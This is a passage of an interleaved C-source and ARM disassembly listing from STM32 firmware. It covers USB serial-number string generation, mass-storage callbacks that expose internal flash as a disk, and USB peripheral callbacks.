 800c550:	68fa      	ldr	r2, [r7, #12]
 800c552:	687b      	ldr	r3, [r7, #4]
 800c554:	4413      	add	r3, r2
 800c556:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c558:	68fb      	ldr	r3, [r7, #12]
 800c55a:	2b00      	cmp	r3, #0
 800c55c:	d009      	beq.n	800c572 <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c55e:	2208      	movs	r2, #8
 800c560:	4909      	ldr	r1, [pc, #36]	; (800c588 <Get_SerialNum+0x50>)
 800c562:	68f8      	ldr	r0, [r7, #12]
 800c564:	f000 f814 	bl	800c590 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c568:	2204      	movs	r2, #4
 800c56a:	4908      	ldr	r1, [pc, #32]	; (800c58c <Get_SerialNum+0x54>)
 800c56c:	68b8      	ldr	r0, [r7, #8]
 800c56e:	f000 f80f 	bl	800c590 <IntToUnicode>
  }
}
 800c572:	bf00      	nop
 800c574:	3710      	adds	r7, #16
 800c576:	46bd      	mov	sp, r7
 800c578:	bd80      	pop	{r7, pc}
 800c57a:	bf00      	nop
 800c57c:	1fff7590 	.word	0x1fff7590
 800c580:	1fff7594 	.word	0x1fff7594
 800c584:	1fff7598 	.word	0x1fff7598
 800c588:	20000206 	.word	0x20000206
 800c58c:	20000216 	.word	0x20000216

0800c590 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c590:	b480      	push	{r7}
 800c592:	b087      	sub	sp, #28
 800c594:	af00      	add	r7, sp, #0
 800c596:	60f8      	str	r0, [r7, #12]
 800c598:	60b9      	str	r1, [r7, #8]
 800c59a:	4613      	mov	r3, r2
 800c59c:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c59e:	2300      	movs	r3, #0
 800c5a0:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c5a2:	2300      	movs	r3, #0
 800c5a4:	75fb      	strb	r3, [r7, #23]
 800c5a6:	e027      	b.n	800c5f8 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c5a8:	68fb      	ldr	r3, [r7, #12]
 800c5aa:	0f1b      	lsrs	r3, r3, #28
 800c5ac:	2b09      	cmp	r3, #9
 800c5ae:	d80b      	bhi.n	800c5c8 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c5b0:	68fb      	ldr	r3, [r7, #12]
 800c5b2:	0f1b      	lsrs	r3, r3, #28
 800c5b4:	b2da      	uxtb	r2, r3
 800c5b6:	7dfb      	ldrb	r3, [r7, #23]
 800c5b8:	005b      	lsls	r3, r3, #1
 800c5ba:	4619      	mov	r1, r3
 800c5bc:	68bb      	ldr	r3, [r7, #8]
 800c5be:	440b      	add	r3, r1
 800c5c0:	3230      	adds	r2, #48	; 0x30
 800c5c2:	b2d2      	uxtb	r2, r2
 800c5c4:	701a      	strb	r2, [r3, #0]
 800c5c6:	e00a      	b.n	800c5de <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c5c8:	68fb      	ldr	r3, [r7, #12]
 800c5ca:	0f1b      	lsrs	r3, r3, #28
 800c5cc:	b2da      	uxtb	r2, r3
 800c5ce:	7dfb      	ldrb	r3, [r7, #23]
 800c5d0:	005b      	lsls	r3, r3, #1
 800c5d2:	4619      	mov	r1, r3
 800c5d4:	68bb      	ldr	r3, [r7, #8]
 800c5d6:	440b      	add	r3, r1
 800c5d8:	3237      	adds	r2, #55	; 0x37
 800c5da:	b2d2      	uxtb	r2, r2
 800c5dc:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c5de:	68fb      	ldr	r3, [r7, #12]
 800c5e0:	011b      	lsls	r3, r3, #4
 800c5e2:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c5e4:	7dfb      	ldrb	r3, [r7, #23]
 800c5e6:	005b      	lsls	r3, r3, #1
 800c5e8:	3301      	adds	r3, #1
 800c5ea:	68ba      	ldr	r2, [r7, #8]
 800c5ec:	4413      	add	r3, r2
 800c5ee:	2200      	movs	r2, #0
 800c5f0:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c5f2:	7dfb      	ldrb	r3, [r7, #23]
 800c5f4:	3301      	adds	r3, #1
 800c5f6:	75fb      	strb	r3, [r7, #23]
 800c5f8:	7dfa      	ldrb	r2, [r7, #23]
 800c5fa:	79fb      	ldrb	r3, [r7, #7]
 800c5fc:	429a      	cmp	r2, r3
 800c5fe:	d3d3      	bcc.n	800c5a8 <IntToUnicode+0x18>
  }
}
 800c600:	bf00      	nop
 800c602:	bf00      	nop
 800c604:	371c      	adds	r7, #28
 800c606:	46bd      	mov	sp, r7
 800c608:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c60c:	4770      	bx	lr

0800c60e <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c60e:	b480      	push	{r7}
 800c610:	b083      	sub	sp, #12
 800c612:	af00      	add	r7, sp, #0
 800c614:	4603      	mov	r3, r0
 800c616:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c618:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c61a:	4618      	mov	r0, r3
 800c61c:	370c      	adds	r7, #12
 800c61e:	46bd      	mov	sp, r7
 800c620:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c624:	4770      	bx	lr

0800c626 <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c626:	b480      	push	{r7}
 800c628:	b085      	sub	sp, #20
 800c62a:	af00      	add	r7, sp, #0
 800c62c:	4603      	mov	r3, r0
 800c62e:	60b9      	str	r1, [r7, #8]
 800c630:	607a      	str	r2, [r7, #4]
 800c632:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c634:	68bb      	ldr	r3, [r7, #8]
 800c636:	2240      	movs	r2, #64	; 0x40
 800c638:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c63a:	687b      	ldr	r3, [r7, #4]
 800c63c:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c640:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c642:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c644:	4618      	mov	r0, r3
 800c646:	3714      	adds	r7, #20
 800c648:	46bd      	mov	sp, r7
 800c64a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c64e:	4770      	bx	lr

0800c650 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c650:	b480      	push	{r7}
 800c652:	b083      	sub	sp, #12
 800c654:	af00      	add	r7, sp, #0
 800c656:	4603      	mov	r3, r0
 800c658:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c65a:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c65c:	4618      	mov	r0, r3
 800c65e:	370c      	adds	r7, #12
 800c660:	46bd      	mov	sp, r7
 800c662:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c666:	4770      	bx	lr

0800c668 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c668:	b480      	push	{r7}
 800c66a:	b083      	sub	sp, #12
 800c66c:	af00      	add	r7, sp, #0
 800c66e:	4603      	mov	r3, r0
 800c670:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c672:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c674:	4618      	mov	r0, r3
 800c676:	370c      	adds	r7, #12
 800c678:	46bd      	mov	sp, r7
 800c67a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c67e:	4770      	bx	lr

0800c680 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c680:	b580      	push	{r7, lr}
 800c682:	b084      	sub	sp, #16
 800c684:	af00      	add	r7, sp, #0
 800c686:	60b9      	str	r1, [r7, #8]
 800c688:	607a      	str	r2, [r7, #4]
 800c68a:	461a      	mov	r2, r3
 800c68c:	4603      	mov	r3, r0
 800c68e:	73fb      	strb	r3, [r7, #15]
 800c690:	4613      	mov	r3, r2
 800c692:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c694:	7bfb      	ldrb	r3, [r7, #15]
 800c696:	2b00      	cmp	r3, #0
 800c698:	d10d      	bne.n	800c6b6 <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c69a:	687b      	ldr	r3, [r7, #4]
 800c69c:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c6a0:	3340      	adds	r3, #64	; 0x40
 800c6a2:	02db      	lsls	r3, r3, #11
 800c6a4:	4619      	mov	r1, r3
 800c6a6:	89bb      	ldrh	r3, [r7, #12]
 800c6a8:	02db      	lsls	r3, r3, #11
 800c6aa:	461a      	mov	r2, r3
 800c6ac:	68b8      	ldr	r0, [r7, #8]
 800c6ae:	f000 fc65 	bl	800cf7c <memcpy>
		return (USBD_OK);
 800c6b2:	2300      	movs	r3, #0
 800c6b4:	e000      	b.n	800c6b8 <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c6b6:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c6b8:	4618      	mov	r0, r3
 800c6ba:	3710      	adds	r7, #16
 800c6bc:	46bd      	mov	sp, r7
 800c6be:	bd80      	pop	{r7, pc}

0800c6c0 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c6c0:	b580      	push	{r7, lr}
 800c6c2:	b08a      	sub	sp, #40	; 0x28
 800c6c4:	af00      	add	r7, sp, #0
 800c6c6:	60b9      	str	r1, [r7, #8]
 800c6c8:	607a      	str	r2, [r7, #4]
 800c6ca:	461a      	mov	r2, r3
 800c6cc:	4603      	mov	r3, r0
 800c6ce:	73fb      	strb	r3, [r7, #15]
 800c6d0:	4613      	mov	r3, r2
 800c6d2:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c6d4:	7bfb      	ldrb	r3, [r7, #15]
 800c6d6:	2b00      	cmp	r3, #0
 800c6d8:	d136      	bne.n	800c748 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c6da:	f7f4 febb 	bl	8001454 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c6de:	2300      	movs	r3, #0
 800c6e0:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c6e2:	2301      	movs	r3, #1
 800c6e4:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c6e6:	687b      	ldr	r3, [r7, #4]
 800c6e8:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c6ec:	3340      	adds	r3, #64	; 0x40
 800c6ee:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c6f2:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c6f4:	89bb      	ldrh	r3, [r7, #12]
 800c6f6:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c6f8:	2300      	movs	r3, #0
 800c6fa:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c6fc:	f107 0210 	add.w	r2, r7, #16
 800c700:	f107 0314 	add.w	r3, r7, #20
 800c704:	4611      	mov	r1, r2
 800c706:	4618      	mov	r0, r3
 800c708:	f7f4 ff8a 	bl	8001620 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c70c:	2300      	movs	r3, #0
 800c70e:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c710:	e011      	b.n	800c736 <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c712:	687b      	ldr	r3, [r7, #4]
 800c714:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c718:	3340      	adds	r3, #64	; 0x40
 800c71a:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c71c:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c71e:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c720:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c722:	68ba      	ldr	r2, [r7, #8]
 800c724:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c726:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c72a:	2000      	movs	r0, #0
 800c72c:	f7f4 fe26 	bl	800137c <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c730:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c732:	3308      	adds	r3, #8
 800c734:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c736:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c738:	89bb      	ldrh	r3, [r7, #12]
 800c73a:	02db      	lsls	r3, r3, #11
 800c73c:	429a      	cmp	r2, r3
 800c73e:	d3e8      	bcc.n	800c712 <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c740:	f7f4 feaa 	bl	8001498 <HAL_FLASH_Lock>
		return USBD_OK;
 800c744:	2300      	movs	r3, #0
 800c746:	e000      	b.n	800c74a <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c748:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c74a:	4618      	mov	r0, r3
 800c74c:	3728      	adds	r7, #40	; 0x28
 800c74e:	46bd      	mov	sp, r7
 800c750:	bd80      	pop	{r7, pc}

0800c752 <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c752:	b480      	push	{r7}
 800c754:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800c756:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c758:	4618      	mov	r0, r3
 800c75a:	46bd      	mov	sp, r7
 800c75c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c760:	4770      	bx	lr
	...

0800c764 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c764:	b580      	push	{r7, lr}
 800c766:	b098      	sub	sp, #96	; 0x60
 800c768:	af00      	add	r7, sp, #0
 800c76a:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c76c:	f107 030c 	add.w	r3, r7, #12
 800c770:	2254      	movs	r2, #84	; 0x54
 800c772:	2100      	movs	r1, #0
 800c774:	4618      	mov	r0, r3
 800c776:	f000 fbd5 	bl	800cf24 <memset>
  if(pcdHandle->Instance==USB)
 800c77a:	687b      	ldr	r3, [r7, #4]
 800c77c:	681b      	ldr	r3, [r3, #0]
 800c77e:	4a1d      	ldr	r2, [pc, #116]	; (800c7f4 <HAL_PCD_MspInit+0x90>)
 800c780:	4293      	cmp	r3, r2
 800c782:	d132      	bne.n	800c7ea <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800c784:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800c788:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800c78a:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800c78e:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800c790:	2301      	movs	r3, #1
 800c792:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800c794:	2301      	movs	r3, #1
 800c796:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800c798:	2318      	movs	r3, #24
 800c79a:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800c79c:	2307      	movs	r3, #7
 800c79e:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800c7a0:	2302      	movs	r3, #2
 800c7a2:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800c7a4:	2302      	movs	r3, #2
 800c7a6:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800c7a8:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800c7ac:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800c7ae:	f107 030c 	add.w	r3, r7, #12
 800c7b2:	4618      	mov	r0, r3
 800c7b4:	f7f7 fe5c 	bl	8004470 <HAL_RCCEx_PeriphCLKConfig>
 800c7b8:	4603      	mov	r3, r0
 800c7ba:	2b00      	cmp	r3, #0
 800c7bc:	d001      	beq.n	800c7c2 <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800c7be:	f7f4 fa03 	bl	8000bc8 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800c7c2:	4b0d      	ldr	r3, [pc, #52]	; (800c7f8 <HAL_PCD_MspInit+0x94>)
 800c7c4:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c7c6:	4a0c      	ldr	r2, [pc, #48]	; (800c7f8 <HAL_PCD_MspInit+0x94>)
 800c7c8:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800c7cc:	6593      	str	r3, [r2, #88]	; 0x58
 800c7ce:	4b0a      	ldr	r3, [pc, #40]	; (800c7f8 <HAL_PCD_MspInit+0x94>)
 800c7d0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c7d2:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800c7d6:	60bb      	str	r3, [r7, #8]
 800c7d8:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800c7da:	2200      	movs	r2, #0
 800c7dc:	2100      	movs	r1, #0
 800c7de:	2043      	movs	r0, #67	; 0x43
 800c7e0:	f7f4 fd95 	bl	800130e <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800c7e4:	2043      	movs	r0, #67	; 0x43
 800c7e6:	f7f4 fdae 	bl	8001346 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800c7ea:	bf00      	nop
 800c7ec:	3760      	adds	r7, #96	; 0x60
 800c7ee:	46bd      	mov	sp, r7
 800c7f0:	bd80      	pop	{r7, pc}
 800c7f2:	bf00      	nop
 800c7f4:	40006800 	.word	0x40006800
 800c7f8:	40021000 	.word	0x40021000

0800c7fc <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c7fc:	b580      	push	{r7, lr}
 800c7fe:	b082      	sub	sp, #8
 800c800:	af00      	add	r7, sp, #0
 800c802:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800c804:	687b      	ldr	r3, [r7, #4]
 800c806:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800c80a:	687b      	ldr	r3, [r7, #4]
 800c80c:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800c810:	4619      	mov	r1, r3
 800c812:	4610      	mov	r0, r2
 800c814:	f7fe fb70 	bl	800aef8 <USBD_LL_SetupStage>
}
 800c818:	bf00      	nop
 800c81a:	3708      	adds	r7, #8
 800c81c:	46bd      	mov	sp, r7
 800c81e:	bd80      	pop	{r7, pc}

0800c820 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c820:	b580      	push	{r7, lr}
 800c822:	b082      	sub	sp, #8
 800c824:	af00      	add	r7, sp, #0
 800c826:	6078      	str	r0, [r7, #4]
 800c828:	460b      	mov	r3, r1
 800c82a:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800c82c:	687b      	ldr	r3, [r7, #4]
 800c82e:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c832:	78fa      	ldrb	r2, [r7, #3]
 800c834:	6879      	ldr	r1, [r7, #4]
 800c836:	4613      	mov	r3, r2
 800c838:	009b      	lsls	r3, r3, #2
 800c83a:	4413      	add	r3, r2
 800c83c:	00db      	lsls	r3, r3, #3
 800c83e:	440b      	add	r3, r1
 800c840:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800c844:	681a      	ldr	r2, [r3, #0]
 800c846:	78fb      	ldrb	r3, [r7, #3]
 800c848:	4619      	mov	r1, r3
 800c84a:	f7fe fbaa 	bl	800afa2 <USBD_LL_DataOutStage>
}
 800c84e:	bf00      	nop
 800c850:	3708      	adds	r7, #8
 800c852:	46bd      	mov	sp, r7
 800c854:	bd80      	pop	{r7, pc}

0800c856 <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c856:	b580      	push	{r7, lr}
 800c858:	b082      	sub	sp, #8
 800c85a:	af00      	add	r7, sp, #0
 800c85c:	6078      	str	r0, [r7, #4]
 800c85e:	460b      	mov	r3, r1
 800c860:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800c862:	687b      	ldr	r3, [r7, #4]
 800c864:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c868:	78fa      	ldrb	r2, [r7, #3]
 800c86a:	6879      	ldr	r1, [r7, #4]
 800c86c:	4613      	mov	r3, r2
 800c86e:	009b      	lsls	r3, r3, #2
 800c870:	4413      	add	r3, r2
 800c872:	00db      	lsls	r3, r3, #3
 800c874:	440b      	add	r3, r1
 800c876:	333c      	adds	r3, #60	; 0x3c
 800c878:	681a      	ldr	r2, [r3, #0]
 800c87a:	78fb      	ldrb	r3, [r7, #3]
 800c87c:	4619      	mov	r1, r3
 800c87e:	f7fe fc43 	bl	800b108 <USBD_LL_DataInStage>
}
 800c882:	bf00      	nop
 800c884:	3708      	adds	r7, #8
 800c886:	46bd      	mov	sp, r7
 800c888:	bd80      	pop	{r7, pc}

0800c88a <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c88a:	b580      	push	{r7, lr}
 800c88c:	b082      	sub	sp, #8
 800c88e:	af00      	add	r7, sp, #0
 800c890:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800c892:	687b      	ldr	r3, [r7, #4]
 800c894:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c898:	4618      	mov	r0, r3
 800c89a:	f7fe fd7d 	bl	800b398 <USBD_LL_SOF>
}
 800c89e:	bf00      	nop
 800c8a0:	3708      	adds	r7, #8
 800c8a2:	46bd      	mov	sp, r7
 800c8a4:	bd80      	pop	{r7, pc}

0800c8a6 <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8a6:	b580      	push	{r7, lr}
 800c8a8:	b084      	sub	sp, #16
 800c8aa:	af00      	add	r7, sp, #0
 800c8ac:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800c8ae:	2301      	movs	r3, #1
 800c8b0:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800c8b2:	687b      	ldr	r3, [r7, #4]
 800c8b4:	689b      	ldr	r3, [r3, #8]
 800c8b6:	2b02      	cmp	r3, #2
 800c8b8:	d001      	beq.n	800c8be <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800c8ba:	f7f4 f985 	bl	8000bc8 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800c8be:	687b      	ldr	r3, [r7, #4]
 800c8c0:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c8c4:	7bfa      	ldrb	r2, [r7, #15]
 800c8c6:	4611      	mov	r1, r2
 800c8c8:	4618      	mov	r0, r3
 800c8ca:	f7fe fd21 	bl	800b310 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800c8ce:	687b      	ldr	r3, [r7, #4]
 800c8d0:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c8d4:	4618      	mov	r0, r3
 800c8d6:	f7fe fcc9 	bl	800b26c <USBD_LL_Reset>
}
 800c8da:	bf00      	nop
 800c8dc:	3710      	adds	r7, #16
 800c8de:	46bd      	mov	sp, r7
 800c8e0:	bd80      	pop	{r7, pc}
	...

0800c8e4 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8e4:	b580      	push	{r7, lr}
 800c8e6:	b082      	sub	sp, #8
 800c8e8:	af00      	add	r7, sp, #0
 800c8ea:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800c8ec:	687b      	ldr	r3, [r7, #4]
 800c8ee:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c8f2:	4618      	mov	r0, r3
 800c8f4:	f7fe fd1c 	bl	800b330 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800c8f8:	687b      	ldr	r3, [r7, #4]
 800c8fa:	699b      	ldr	r3, [r3, #24]
 800c8fc:	2b00      	cmp	r3, #0
 800c8fe:	d005      	beq.n	800c90c <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
